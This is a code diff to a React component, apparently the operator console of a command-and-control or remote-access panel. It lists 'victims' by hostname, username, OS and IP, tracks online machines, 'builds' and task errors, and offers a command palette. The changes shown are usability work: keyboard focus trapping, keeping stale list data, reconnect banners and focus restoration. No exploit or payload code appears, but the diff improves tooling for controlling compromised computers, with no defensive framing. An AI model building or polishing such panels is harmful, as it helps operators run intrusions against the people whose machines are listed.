@@ -84,6 +84,7 @@ export function OperationsView() {
   const canWrite = useCanWrite();
   const live = useLiveContext();
   const tableBox = useRef<HTMLDivElement>(null);
+  const lastRowFocus = useRef<HTMLElement | null>(null);
   const noticeTimer = useRef<number | null>(null);
 
   useEffect(() => { setSort(readSavedSort()); }, []);
@@ -96,7 +97,7 @@ export function OperationsView() {
     return next.toString();
   }, [params]);
 
-  const victims = useApi<{ items: Victim[]; next: string | null }>(`/victims?${filterQuery}`, { pollMs: 10_000 });
+  const victims = useApi<{ items: Victim[]; next: string | null }>(`/victims?${filterQuery}`, { pollMs: 10_000, keepData: true });
   const builds = useApi<{ items: Build[] }>('/builds');
   const selectedId = selected[0] ?? null;
   const fromList = victims.data?.items.find((victim) => victim.id === selectedId) ?? null;
@@ -131,6 +132,22 @@ export function OperationsView() {
   }, [notice]);
 
   useEffect(() => {
+    if (!victim) return;
+    const node = document.getElementById('victim-detail');
+    const onKey = (event: KeyboardEvent) => {
+      if (event.key !== 'Tab' || !node) return;
+      const nodes = [...node.querySelectorAll<HTMLElement>('button, a[href], input, select, textarea, [tabindex]:not([tabindex="-1"])')].filter((item) => !item.hasAttribute('disabled'));
+      if (nodes.length === 0) return;
+      const first = nodes[0]!;
+      const last = nodes.at(-1)!;
+      if (event.shiftKey && document.activeElement === first) { event.preventDefault(); last.focus(); }
+      else if (!event.shiftKey && document.activeElement === last) { event.preventDefault(); first.focus(); }
+    };
+    window.addEventListener('keydown', onKey);
+    return () => window.removeEventListener('keydown', onKey);
+  }, [Boolean(victim)]); // eslint-disable-line react-hooks/exhaustive-deps
+
+  useEffect(() => {
     const last = live.events[0];
     if (!last || document.visibilityState === 'visible') return;
     if (last.type === 'task.update' && (last.data as { status?: string }).status === 'error') {
@@ -153,9 +170,21 @@ export function OperationsView() {
   }, []);
 
   const openDetail = useCallback((victimRow: Victim) => {
+    lastRowFocus.current = document.activeElement as HTMLElement | null;
     setSelected([victimRow.id]);
     setTab('resumen');
   }, []);
+
+  useEffect(() => {
+    if (victim) {
+      document.body.style.overflow = 'hidden';
+      document.getElementById('victim-detail')?.focus();
+    } else {
+      document.body.style.overflow = '';
+      lastRowFocus.current?.focus?.();
+    }
+    return () => { document.body.style.overflow = ''; };
+  }, [Boolean(victim)]); // eslint-disable-line react-hooks/exhaustive-deps
 
   const openMenu = useCallback((victimRow: Victim, x: number, y: number) => {
     setMenu({ victim: victimRow, x, y });
@@ -287,14 +316,19 @@ export function OperationsView() {
     <div className="relative flex h-[calc(100dvh-6.5rem)] min-h-[540px] flex-col overflow-hidden rounded-xl border border-line/80 bg-panel/20 shadow-panel">
       <Topbar
         title={victim ? victim.hostname : 'Equipos'}
-        subtitle={victim ? `${victim.username} · ${victim.os} · ${victim.ip ?? 'sin IP'}` : `${victims.data?.items.length ?? 0} equipos · ${onlineCount} online · consola única de operación`}
+        subtitle={victim ? `${victim.username} · ${victim.os} · ${victim.ip ?? 'sin IP'}` : `${victims.data?.items.length ?? 0} equipos · ${onlineCount} online · ! = módulo degradado`}
         onCommand={() => victim ? setPalette((value) => !value) : setNotice({ tone: 'warn', text: 'Selecciona un equipo antes de abrir la paleta.' })}
         onSlash={focusSearch}
       />
 
-      {!live.connected ? (
-        <div className="flex items-center gap-2 border-b border-bad/30 bg-bad/10 px-3 py-1 text-2xs text-bad" role="alert">
-          <WifiOff className="h-3 w-3" /> Sin stream del panel: las acciones quedan deshabilitadas hasta reconectar. Los datos en pantalla pueden estar viejos.
+      {live.status !== 'open' ? (
+        <div className="flex flex-wrap items-center gap-2 border-b border-bad/30 bg-bad/10 px-3 py-1 text-2xs text-bad" role="alert">
+          <WifiOff className="h-3 w-3" /> {live.status === 'connecting' ? 'Reconectando el stream del panel…' : 'Sin stream del panel: las acciones quedan deshabilitadas hasta reconectar.'} Los datos en pantalla pueden estar viejos.
+          <button className="ml-auto underline" onClick={live.reconnect}>Reintentar ahora</button>
+        </div>
+      ) : victims.stale ? (
+        <div className="flex items-center gap-2 border-b border-warn/30 bg-warn/10 px-3 py-1 text-2xs text-warn" role="status">
+          <AlertTriangle className="h-3 w-3" /> No se pudo refrescar la lista; se muestra el último dato conocido.
         </div>
       ) : null}
 
@@ -310,7 +344,7 @@ export function OperationsView() {
 
       <div className="flex min-h-0 flex-1">
         <div ref={tableBox} className="flex min-w-0 flex-1 flex-col">
-          {victims.error ? <ErrorState title="No se pudo cargar la lista" message={explain(victims.error)} retry={victims.refresh} /> : (
+          {victims.error && !victims.data ? <ErrorState title="No se pudo cargar la lista" message={explain(victims.error)} retry={victims.refresh} /> : (
             <VictimTable
               items={ordered}
               loading={victims.loading && !victims.data}
